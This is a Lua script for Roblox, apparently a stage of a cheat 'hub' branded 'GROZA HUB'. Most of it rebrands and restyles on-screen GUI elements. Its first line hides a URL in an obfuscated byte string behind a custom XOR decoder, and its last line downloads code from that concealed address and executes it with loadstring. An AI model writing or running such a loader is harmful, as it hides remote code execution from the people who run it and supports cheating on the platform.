
--[[ STAGE 2: VISUAL CORE ]]
local xRUTvm2EuEHIFUpYEN6="\163\195\199\199\202\133\126\130\217\208\230\145\222\216\247\223\000\237\008\006\000\013\002\002\005\035\024\017\047\217\034\034\040\234\045\050\053\064\064\076\072\080\077\102\095\026\097\117\100\110\106\138\124\123\127\066\136\144\140\145\086\206\215\200\201\203\216\226\234\207\200\204\207\250\245\211\228\010\253\226\010\235\236\007\038\045\252\009\031\063\033\016\024\036\059\060\041\090\098\050\080\077\066\076\118\083\035\040\044\047\056\107\106\041\111\140\124"local XGwUMsguD84b=42 local yYUU436kRZSJwiv=92 local j3y0DGrSBfufIk38CS_ggR=0 local tziVVOzriosCHekxJ=4 local CDiPYTMYoU0PKQ2d7z3y=1 local uRbJBE7eBA0ot=false local ZMa3yxYyoiIn2eszr9LR=bit32 and bit32.bxor if not ZMa3yxYyoiIn2eszr9LR then ZMa3yxYyoiIn2eszr9LR=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local WIJqevcF35oOIE={}for N04aZqCQwyDJ5eAKS0=1,#xRUTvm2EuEHIFUpYEN6 do local ZN0fUzPp2DMbI=string.byte(xRUTvm2EuEHIFUpYEN6,N04aZqCQwyDJ5eAKS0)local boH1uARbVzpkE_4568=(yYUU436kRZSJwiv+(N04aZqCQwyDJ5eAKS0*tziVVOzriosCHekxJ)+CDiPYTMYoU0PKQ2d7z3y)%256 if j3y0DGrSBfufIk38CS_ggR==0 then ZN0fUzPp2DMbI=(ZN0fUzPp2DMbI-boH1uARbVzpkE_4568)%256 WIJqevcF35oOIE[N04aZqCQwyDJ5eAKS0]=string.char(ZMa3yxYyoiIn2eszr9LR(ZN0fUzPp2DMbI,XGwUMsguD84b))else ZN0fUzPp2DMbI=ZMa3yxYyoiIn2eszr9LR(ZN0fUzPp2DMbI,XGwUMsguD84b)WIJqevcF35oOIE[N04aZqCQwyDJ5eAKS0]=string.char((ZN0fUzPp2DMbI-boH1uARbVzpkE_4568)%256)end end local VpNhzgeF33DwFSH29VEh=table.concat(WIJqevcF35oOIE)if uRbJBE7eBA0ot then VpNhzgeF33DwFSH29VEh=string.reverse(VpNhzgeF33DwFSH29VEh)end local vfg8TUZukN36=VpNhzgeF33DwFSH29VEh
local HubName = "GROZA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(vfg8TUZukN36))()
